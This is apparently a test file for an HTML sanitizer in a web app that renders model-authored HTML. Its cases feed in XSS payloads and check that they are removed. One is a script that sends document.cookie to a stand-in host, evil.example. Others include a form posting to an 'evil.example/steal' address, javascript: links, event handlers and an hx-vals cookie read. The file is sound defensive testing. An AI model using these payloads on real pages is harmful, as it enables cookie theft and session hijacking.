import { describe, expect, test } from "bun:test"
import { render } from "./html.js"
import { sanitizeHtml, SANITIZE_MAX_BYTES } from "./sanitize.js"

const clean = (s: string): string => render(sanitizeHtml(s).html)

describe("sanitizeHtml — attack cases", () => {
  test("script tags are dropped WITH their contents", () => {
    const out = clean(`<div>ok</div><script>fetch("https://evil.example/x?c="+document.cookie)</script>`)
    expect(out).toBe("<div>ok</div>")
  })

  test("script content containing a fake close string still terminates at the real close", () => {
    const out = clean(`<script>var a = "<b>' </sCrIpT ";</script><p>after</p>`)
    expect(out).not.toContain("var a")
    expect(out).toContain("<p>after</p>")
  })

  test("style / iframe / object / svg / math / template / noscript are dropped with contents", () => {
    ;["style", "iframe", "object", "svg", "math", "template", "noscript"].forEach((t) => {
      const out = clean(`<${t}><b>payload</b></${t}><i>keep</i>`)
      expect(out).not.toContain("payload")
      expect(out).toContain("<i>keep</i>")
    })
  })

  test("nested svg is skipped fully (depth counting)", () => {
    const out = clean(`<svg><svg><a href="javascript:x">in</a></svg><b>still svg</b></svg><p>out</p>`)
    expect(out).not.toContain("still svg")
    expect(out).toContain("<p>out</p>")
  })

  test("on* handlers and hx-on are stripped", () => {
    const out = clean(`<button onclick="alert(1)" ONMOUSEOVER="x" hx-on:click="evil()" class="ef-btn">go</button>`)
    expect(out).toBe(`<button class="ef-btn">go</button>`)
  })

  test("javascript: URLs are stripped from href", () => {
    expect(clean(`<a href="javascript:alert(1)">x</a>`)).toBe("<a>x</a>")
    expect(clean(`<a href="jAvAsCrIpT:alert(1)">x</a>`)).toBe("<a>x</a>")
    expect(clean(`<a href="data:text/html,<script>1</script>">x</a>`)).toBe("<a>x</a>")
  })

  test("external https links get noopener + _blank; agent-provided target/rel dropped", () => {
    const out = clean(`<a href="https://example.com" target="_top" rel="opener">x</a>`)
    expect(out).toBe(`<a href="https://example.com" target="_blank" rel="noopener noreferrer">x</a>`)
  })

  test("img src must be https or relative; data: is dropped", () => {
    expect(clean(`<img src="data:image/svg+xml;base64,AAAA">`)).toBe("<img />")
    expect(clean(`<img src="https://example.com/x.png" alt="a">`)).toBe(`<img src="https://example.com/x.png" alt="a" />`)
    expect(clean(`<img src="/assets/x.png">`)).toBe(`<img src="/assets/x.png" />`)
  })

  test("form posts may only target /action/*", () => {
    expect(clean(`<form hx-post="/action/ui"><input name="a"></form>`)).toBe(
      `<form hx-post="/action/ui"><input name="a" /></form>`,
    )
    expect(clean(`<form hx-post="https://evil.example/steal">x</form>`)).toBe("<form>x</form>")
    expect(clean(`<form hx-post="/shutdown">x</form>`)).toBe("<form>x</form>")
    expect(clean(`<form action="/send" method="post">x</form>`)).toBe(`<form method="post">x</form>`)
  })

  test("formaction and srcset are stripped", () => {
    expect(clean(`<button formaction="/shutdown">x</button>`)).toBe("<button>x</button>")
    expect(clean(`<img srcset="https://e/x 1x" src="/a.png">`)).toBe(`<img src="/a.png" />`)
  })

  test("style attribute is stripped", () => {
    expect(clean(`<div style="position:fixed;inset:0">x</div>`)).toBe("<div>x</div>")
  })

  test("hx-vals with js: prefix is stripped", () => {
    expect(clean(`<div hx-vals='js:{x:document.cookie}'>x</div>`)).toBe("<div>x</div>")
    expect(clean(`<div hx-vals='{"a":1}'>x</div>`)).toBe(`<div hx-vals="{&quot;a&quot;:1}">x</div>`)
  })

  test("data-hx-* aliases obey the same rules as hx-*", () => {
    expect(clean(`<form data-hx-post="https://evil.example">x</form>`)).toBe("<form>x</form>")
    expect(clean(`<form data-hx-post="/action/ui">x</form>`)).toBe(`<form hx-post="/action/ui">x</form>`)
    expect(clean(`<div data-hx-on:click="evil()">x</div>`)).toBe("<div>x</div>")
  })

  test("ws-send / ws-connect / hx-ext / hx-swap-oob / hx-headers are stripped", () => {
    expect(clean(`<form ws-send hx-ext="ws" ws-connect="/ws">x</form>`)).toBe("<form>x</form>")
    expect(clean(`<div hx-swap-oob="true" id="decoy">x</div>`)).toBe(`<div id="decoy">x</div>`)
    expect(clean(`<div hx-headers='{"X":"1"}'>x</div>`)).toBe("<div>x</div>")
  })

  test("ids cannot spoof chrome or keyed-fragment prefixes", () => {
    expect(clean(`<div id="ef-composer">decoy</div>`)).toBe("<div>decoy</div>")
    expect(clean(`<div id="blk-m_3A1">decoy</div>`)).toBe("<div>decoy</div>")
    expect(clean(`<div id="ui-x">decoy</div>`)).toBe("<div>decoy</div>")
    expect(clean(`<div id="my-quiz">ok</div>`)).toBe(`<div id="my-quiz">ok</div>`)
  })

  test("hx-target may only reference safe ids or `this`", () => {
    expect(clean(`<button hx-target="#ef-rail">x</button>`)).toBe("<button>x</button>")
    expect(clean(`<button hx-target="#my-quiz">x</button>`)).toBe(`<button hx-target="#my-quiz">x</button>`)
    expect(clean(`<button hx-target="this">x</button>`)).toBe(`<button hx-target="this">x</button>`)
    expect(clean(`<button hx-target="closest form, #x">x</button>`)).toBe("<button>x</button>")
  })

  test("input types outside the safe set are dropped", () => {
    expect(clean(`<input type="file" name="f">`)).toBe(`<input name="f" />`)
    expect(clean(`<input type="password" name="p">`)).toBe(`<input name="p" />`)
    expect(clean(`<input type="text" name="t">`)).toBe(`<input type="text" name="t" />`)
  })

  test("unknown tags unwrap but keep children", () => {
    expect(clean(`<blink><b>hi</b></blink>`)).toBe("<b>hi</b>")
    expect(clean(`<custom-el attr="x">text</custom-el>`)).toBe("text")
  })

  test("comments, doctype and processing instructions vanish", () => {
    expect(clean(`<!-- secret --><!DOCTYPE html><?php evil() ?><p>ok</p>`)).toBe("<p>ok</p>")
  })

  test("unbalanced markup is re-balanced (can't swallow siblings)", () => {
    expect(clean(`<div><b>unclosed`)).toBe("<div><b>unclosed</b></div>")
    expect(clean(`</div></div><p>ok</p>`)).toBe("<p>ok</p>")
    expect(clean(`<div><i>x</div>`)).toBe("<div><i>x</i></div>")
  })

  test("stray < and > in text are escaped", () => {
    expect(clean(`a < b and c > d`)).toBe("a &lt; b and c &gt; d")
    expect(clean(`<p>1 <2</p>`)).toBe("<p>1 &lt;2</p>")
  })

  test("attribute values are quoted and escaped on re-emit", () => {
    expect(clean(`<div title='has "quotes" &amp; amp'>x</div>`)).toBe(
      `<div title="has &quot;quotes&quot; &amp;amp; amp">x</div>`,
    )
  })

  test("oversized input is truncated and flagged", () => {
    const big = `<p>${"a".repeat(SANITIZE_MAX_BYTES)}</p>`
    const res = sanitizeHtml(big)
    expect(res.dropped).toContain("(truncated: input over 256KB)")
    expect(render(res.html).length).toBeLessThanOrEqual(SANITIZE_MAX_BYTES + 64)
  })

  test("dropped list names what was removed", () => {
    const res = sanitizeHtml(`<script>x</script><div onclick="y">z</div>`)
    expect(res.dropped).toContain("script")
    expect(res.dropped).toContain("div[onclick]")
  })

  test("a realistic exercise card survives intact", () => {
    const card = `<form class="ef-card ef-stack" hx-post="/action/ui" hx-swap="none"><input type="hidden" name="exercise" value="ex-1" /><p class="ef-text">What is 1/2 + 1/4?</p><input class="ef-input" name="answer" /><button class="ef-btn ef-btn--primary" type="submit">Submit</button></form>`
    const res = sanitizeHtml(card)
    expect(res.dropped).toEqual([])
    expect(render(res.html)).toContain(`hx-post="/action/ui"`)
    expect(render(res.html)).toContain(`name="answer"`)
  })

  test("chrome-reserved class tokens are stripped; kit classes survive", () => {
    // A model wrapping its page in class="ef-page" would hijack the shell.
    const res = sanitizeHtml(`<div class="ef-page"><section class="ef-card ef-stage"><p class="ef-text">hi</p></section></div>`)
    const out = render(res.html)
    expect(out).not.toContain("ef-page")   // chrome — stripped
    expect(out).not.toContain("ef-stage")  // chrome — stripped
    expect(out).toContain("ef-card")       // kit — kept
    expect(out).toContain("ef-text")       // kit — kept
    expect(res.dropped.some((d) => d.includes("chrome"))).toBe(true)
  })

  test("aside is allowed (the ef-aside split-column recipe keeps its tag + class)", () => {
    const res = sanitizeHtml(`<div class="ef-split"><div><p>main</p></div><aside class="ef-aside">facts</aside></div>`)
    expect(res.dropped).toEqual([])
    expect(render(res.html)).toContain(`<aside class="ef-aside">`)
  })

  test("mermaid SOURCE rides through as escaped pre text (class intact; SVG stays banned)", () => {
    const res = sanitizeHtml(`<pre class="ef-mermaid">graph TD; A["Start"]-->B</pre>`)
    expect(res.dropped).toEqual([])
    const out = render(res.html)
    expect(out).toContain(`<pre class="ef-mermaid">`)
    expect(out).toContain(`graph TD; A["Start"]--&gt;B`)
    // Hand-written SVG is still dropped with contents — diagrams render
    // client-side from source text, never from model-authored SVG.
    expect(sanitizeHtml(`<svg><circle r="9"/></svg>`).dropped).toContain("svg")
  })
})
